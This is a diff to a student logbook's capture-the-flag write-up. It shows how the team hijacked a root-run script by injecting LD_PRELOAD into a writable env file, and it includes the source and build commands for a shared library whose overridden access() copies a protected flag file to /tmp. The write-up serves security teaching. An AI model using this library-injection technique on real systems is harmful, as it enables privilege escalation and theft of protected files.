@@ -180,11 +180,6 @@ int main() {
 
 2. We checked the available files and respective permissions. The admin left a note that gave us a hint that accessing the /tmp folder will be important to find the flag.
 
-**Permissions of the files:**
-
-![Permissions](/Logbooks/img/Week4/permissions.png)
-
-
 **my_script.sh:**
 
 ![myScript](/Logbooks/img/Week4/myScript.png)
@@ -193,3 +188,76 @@ int main() {
 **Running my_script.sh:**
 
 ![runningMyScript](/Logbooks/img/Week4/runScript.png)
+
+
+**main.c:**
+```c++
+#include <stdio.h>
+#include <unistd.h>
+
+void my_big_congrats(){
+    puts("TODO - Implement this in the near future!");
+}
+
+int main() {
+    puts("I'm going to check if the flag exists!");
+
+    if (access("/flags/flag.txt", F_OK) == 0) {
+        puts("File exists!!");
+        my_big_congrats();
+    } else {
+        puts("File doesn't exist!");
+    }
+
+    return 0;
+```
+
+3. Analysing these files, we realized that `my_script.sh` intended to define the environment variables trough the file present in `/home/flag_reader/env` if it exists and after that execute the program `reader`.
+
+4. By checking the permissions of the files, we checked that we had permission to change `env` and that it pointed to a env in a folder tmp
+
+**Permissions of the files:**
+
+![Permissions](/Logbooks/img/Week4/permissions.png)
+
+5. To achieve the flag, we based our program on the Task 7 of this week. We started by going to the folder `tmp` and there we inserted our program to overload the access function, we called it myLIB.c:
+
+**myLIB.c:**
+```c++
+#include <stdio.h>
+#include <stdlib.h>
+int access(const char *pathname, int mode) {
+    system("cat /flags/flag.txt > /tmp/myflag.txt");
+    return 0;
+}
+
+
+gcc -fPIC -g -c myLIB.c
+
+gcc -shared -o myLIB.so.1.0.1 myLIB.o -lc
+```
+
+6. Our main goal was to create our own custom dynamic link library (myLIB.c) and inject a EV LD_PRELOAD into `env` so that when the server runs `my_script` in root mode, that variable is exported. After that, the `reader` runs. 
+
+```
+$ gcc -fPIC -g -c myLIB.c
+```
+
+```
+gcc -shared -o myLIB.so.1.0.1 myLIB.o -lc
+```
+
+![compile1](/Logbooks/img/Week4/compile1.png?ref_type=heads)
+
+![compile2](/Logbooks/img/Week4/compile2.png?ref_type=heads)
+
+![envModified](/Logbooks/img/Week4/envModified.png?ref_type=heads)
+
+7. Doing this, our shared library is loaded before all the other ones, letting us override the access() function called in main.c. With this, we can copy the flag.txt present in the folder `/flags` to our own .txt file in the `/tmp` folder, we called it myflag.txt. Then we gave this file all the permissions with the command `chmod 4777 myflag.txt` and waited until the flag was transfered. Waiting a few minutes we got this:
+
+![myFlag](/Logbooks/img/Week4/myflag.png?ref_type=heads)
+
+
+## Observations
+
+- We could have resolved this CTF challenge way earlier since we tried to implemented this exact same resolution the other week but we had no result since everyone could change what was present in the tmp folder. Because of that, our files were changed or the EV present in the env file was altered causing our program to not run properly and so making us think that our implementation was wrong when it wasn't.
